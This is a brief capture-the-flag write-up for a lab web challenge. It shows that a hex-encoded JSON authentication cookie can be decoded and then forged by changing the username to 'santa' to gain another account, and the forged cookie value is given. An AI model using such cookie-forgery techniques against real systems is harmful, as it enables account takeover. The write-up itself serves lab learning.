# [Web Exploitation] A Christmas Crisis

IP: 10.10.58.111

### Cookie for Authentication:
- Name of cookie used for authentication: `auth`
- `letri:letri` `Cookie: auth=7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a226c65747269227d`

### Encoding for cookie:
- Hexadecimal
`{"company":"The Best Festival Company", "username":"letri"}`
- Cookie decoder: https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')

### Format of data:
- JSON

### Santa's cookie:
- `7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d`

### Flag:
- Changed the local storage cookie to the santa's cookie
- Flag `THM{MjY0Yzg5NTJmY2Q1***********}`

